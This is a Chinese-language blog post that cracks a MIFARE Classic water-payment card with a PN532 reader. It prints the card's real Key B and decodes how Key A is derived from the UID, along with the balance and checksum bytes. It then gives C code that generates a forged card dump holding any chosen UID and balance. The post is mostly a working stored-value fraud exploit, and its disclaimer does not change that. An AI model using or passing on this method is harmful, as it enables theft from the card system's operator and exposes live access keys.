---
title: 一张水卡的数据解析及利用（M1卡破解）
description: 目前最便宜好用的 NFC 读卡器当属 PN532 模块了，那我们能用它来做些什么呢？（坏笑）
date: 2024-08-24T12:15:50.969Z
tags:
    - C++
    - RFID
categories:
    - 逆向破解
draft: false
---

## 设备 & 软件

目前最便宜好用的 NFC 读卡器当属 PN532 模块了，将它连接到电脑上还需要一个 TTL 转 USB 工具，这里使用 CH340 转接板。连接好读卡器的串口排线，就可以使用 M1T 等软件尝试解密钥啦。

## 解析密钥 & 读取数据

使用 M1T 解析出 IC 卡的 Key B 为 `A9 DE 7F 3C EB 1F`。
读取数据进行分析，以下是该卡的第 10 和 11 扇区以及 0 扇区的块 0，除此之外的扇区数据均为空。

```txt
Section 0
Block 0: 5E E1 6E A4 75 08 04 00 01 DD 54 AF A4 43 D6 1D

Section 10
Block 0: 23 0A 01 00 09 F5 00 D6 02 00 5E 00 00 5E 00 62
Block 1: 1B F5 03 EE 04 0A AA 00 A0 01 83 1B 00 9E 00 84
Block 2: 23 0A 01 00 09 F5 00 D6 02 00 5E 00 00 5E 00 62
Block 3: 0A A1 1E 91 5B 81 7F 07 88 69 A9 DE 7F 3C EB 1F

Section 11
Block 0: C1 3E 12 2C 00 C1 00 00 00 00 06 00 00 06 00 B6
Block 1: 1B F5 03 EE 04 0A AA 00 A0 01 83 1B 00 9E 00 84
Block 2: C1 3E 12 2C 00 C1 00 00 00 00 06 00 00 06 00 B6
Block 3: 0B A1 1E 91 5B 81 7F 07 88 69 A9 DE 7F 3C EB 1F
```

## 分析数据

通过观察发现，这些扇区的 Key A 并不相同，而 Key B 为固定值；并且第 10 扇区和第 11 扇区中块 0 和块 2 的数据相同。
通过多次刷卡发现，第 10 扇区会被刷卡机修改，而第 11 扇区未被使用。
接下来的分析重点将放在 Key A 和第 10 扇区上。

### Key A 的分析

通过观察发现 Key A 的结构如下：

**<font color="blue">0A</font> <font color="deeppink">A1 1E 91 5B</font> <font color="orange">81</font>**

| 数据位 | 作用 | 计算 |
| :- | :- | :- |
| **<font color="blue">0A</font>** | 扇区号 | `0A` |
| **<font color="deeppink">A1 1E 91 5B</font>** | 取反 UID | `~5E ~E1 ~6E ~A4` |
| **<font color="orange">81</font>** | 固定值 | `81` |

### 块 0 的分析

通过多次比对数据改动和刷卡机显示的数额，猜测出一些数据位的作用如下：

**<font color="blue">23</font> <font color="brown">0A</font> <font color="deeppink">01 00</font> 09 <font color="purple">F5</font> 00 <font color="mediumblue">D6 02</font> 00 <font color="orange">5E</font> 00 00 <font color="orange">5E</font> 00 <font color="magenta">62</font>**

| 数据位 | 作用 | 计算 |
| :- | :- | :- |
| **<font color="blue">23</font>** | 异或校验 | `0A ^ 01 ^ 00 ^ 09 ^ F5 ^ 00 ^ D6 ^ 02 ^ 00 ^ 5E ^ 00 ^ 00 ^ 5E ^ 00` |
| **<font color="brown">0A</font>** | 和校验 | `01 + 00 + 09` |
| **<font color="deeppink">01 00</font>** | 剩余数额 | `0.01 * 100` |
| **<font color="purple">F5</font>** | 和取反校验 | `~ (01 + 00 + 09)` |
| **<font color="mediumblue">D6 02</font>** | 上次使用数额 | `7.26 * 100` |
| **<font color="orange">5E</font>** | 使用次数 |  |
| **<font color="magenta">62</font>** | 和取反校验 | `~  (0A + 01 + 00 + 09 + F5 + 00 + D6 + 02 + 00 + 5E + 00 + 00 + 5E + 00)` |

黑色标注的数据猜测为无实际作用的数据。

### 块 1 的分析

这里的数据是固定的，不知道用途，但可以猜测出第一位和最后一位为校验位：

**<font color="blue">1B</font> F5 03 EE 04 0A AA 00 A0 01 83 1B 00 9E 00 <font color="magenta">84</font>**

| 数据位 | 作用 | 计算 |
| :- | :- | :- |
| **<font color="blue">1B</font>** | 异或校验 | `F5 ^ 03 ^ EE ^ 04 ^ 0A ^ AA ^ 00 ^ A0 ^ 01 ^ 83 ^ 1B ^ 00 ^ 9E ^ 00` |
| **<font color="magenta">84</font>** | 和取反校验 | `~  (F5 + 03 + EE + 04 + 0A + AA + 00 + A0 + 01 + 83 + 1B + 00 + 9E + 00)` |

通过比对，尝试将不同的数据位置零后也可以正常使用。

## 利用

先构建 M1 卡的结构。

```c
// M1Card.h
#pragma once

#include <stdint.h>

typedef struct TM1CardManufacturerBlock {
    uint32_t UID;
    uint8_t UIDXorChecksum;
    uint8_t SAK;
    uint16_t ATQA;
    uint8_t ManufacturerInfomation[8];
} M1CardManufacturerBlock, *PM1CardManufacturerBlock;

typedef struct TM1CardKeyBlock {
    uint8_t KeyA[6];
    uint8_t AccessBits[4];
    uint8_t KeyB[6];
} M1CardKeyBlock, *PM1CardKeyBlock;

typedef struct TM1CardSector {
    union {
        M1CardManufacturerBlock ManufacturerBlock;
        uint8_t DataBlock0[16];
    };
    uint8_t DataBlock1[16];
    uint8_t DataBlock2[16];
    M1CardKeyBlock KeyBlock;
} M1CardSector, *PM1CardSector;

void M1Card_SetCardInfomation(PM1CardSector cardData, uint32_t uid, uint8_t sak, uint16_t atqa);
```

实现 M1 卡制造商信息设置函数。

```c
// M1Card.c
#include "M1Card.h"

void M1Card_SetCardInfomation(PM1CardSector cardData, uint32_t uid, uint8_t sak, uint16_t atqa) {
    uint8_t* uidData = (uint8_t*) &uid;

    cardData->ManufacturerBlock.UID = uid;
    cardData->ManufacturerBlock.UIDXorChecksum = uidData[0] ^ uidData[1] ^ uidData[2] ^ uidData[3];
    cardData->ManufacturerBlock.SAK = sak;
    cardData->ManufacturerBlock.ATQA = atqa;
}
```

然后构建解析出的水卡的结构。

```c
// WaterCard.h
#pragma once

#include <stdint.h>
#include "M1Card.h"

typedef struct TWaterCardSector {
    uint8_t OverallXorChecksum;
    uint8_t AmountSumChecksum;
    union {
        uint16_t Amount;
        struct {
            uint8_t AmountByte1;
            uint8_t AmountByte2;
        };
    };
    uint8_t Padding1Byte1;
    uint8_t AmountSumXorChecksum;
    uint8_t Padding5Bytes[5];
    uint8_t UsageCountSum;
    uint8_t Padding1Byte2;
    uint8_t UsageCountSumChecksum;
    uint8_t Padding1Byte3;
    uint8_t OverallSumXorChecksum;
} WaterCardSector, *PWaterCardSector;

typedef struct TWaterCardKeyA {
    uint8_t Index;
    uint8_t UIDXorChecksum[4];
    uint8_t Padding1Byte;
} WaterCardKeyA, *PWaterCardKeyA;

void WaterCard_SetCard(PM1CardSector cardData, uint32_t uid, uint16_t amount);
```

最后实现利用函数。

```c
// WaterCard.c
#include <string.h>
#include "WaterCard.h"

void WaterCard_SetKey(PM1CardSector cardData, uint32_t uid) {
    for (int i = 0; i < 16; i++) {
        PM1CardKeyBlock key = &cardData[i].KeyBlock;
        PWaterCardKeyA keyA = (PWaterCardKeyA) &key->KeyA;
        uint8_t* uidData = (uint8_t*) &uid;

        keyA->Index = (uint8_t) i;
        keyA->Padding1Byte = 0x81;
        for (int i = 0; i < 4; i++) {
            keyA->UIDXorChecksum[i] = ~uidData[i];
        }

        *((uint16_t*) key->KeyB) = 0xDEA9;
        *((uint32_t*) (key->KeyB + 2)) = 0x1FEB3C7F;
        *((uint32_t*) key->AccessBits) = 0x6988077F;
    }
}

void WaterCard_SetDataSector(PM1CardSector cardData, uint16_t amount) {
    uint8_t* sectorData = cardData[10].DataBlock0;
    uint8_t* sectorDataCopy = cardData[10].DataBlock2;
    PWaterCardSector sector = (PWaterCardSector) sectorData;
    memset(sector, 0, 16);

    sector->Amount = amount;
    sector->AmountSumChecksum = sector->AmountByte1 + sector->AmountByte2 + sector->Padding1Byte1;
    sector->AmountSumXorChecksum = ~sector->AmountSumChecksum;

    for (int i = 1; i < 14; i++) {
        sector->OverallXorChecksum ^= sectorData[i];
        sector->OverallSumXorChecksum += sectorData[i];
    }
    sector->OverallSumXorChecksum = ~sector->OverallSumXorChecksum;

    memcpy_s(sectorDataCopy, 16, sectorData, 16);
}

void WaterCard_SetDataIDSector(PM1CardSector cardData) {
    uint64_t idData0 = 0x00AA0A04EE03F51D;
    uint64_t idData1 = 0xC0000000000001A0;
    uint64_t* sectorData = (uint64_t*) cardData[10].DataBlock1;
    sectorData[0] = idData0;
    sectorData[1] = idData1;
}

void WaterCard_SetCard(PM1CardSector cardData, uint32_t uid, uint16_t amount) {
    M1Card_SetCardInfomation(cardData, uid, 8, 4);
    WaterCard_SetKey(cardData, uid);
    WaterCard_SetDataIDSector(cardData);
    WaterCard_SetDataSector(cardData, amount);
}
```

测试生成 Dump 文件。

```c
// Main.c
#include <stdio.h>
#include <stdlib.h>
#include "WaterCard.h"

int main() {
    size_t size = sizeof(M1CardSector) * 16;
    PM1CardSector cardData = (PM1CardSector) malloc(size);
    if (!cardData) {
        return -1;
    }

    // UID: F7-F7-F7-02, Amount: 8.08
    WaterCard_SetCard(cardData, 0x02F7F7F7, 0x2803);
    
    FILE* file;
    fopen_s(&file, "Card.dump", "wb");
    if (!file) {
        free(cardData);
        return -1;
    }
    fwrite(cardData, size, 1, file);
    fclose(file);

    free(cardData);
    return 0;
}
```

## 写在结尾

<font color="red">⚠⚠⚠ 本篇文章仅供学习，请勿用于非法用途！⚠⚠⚠</font>
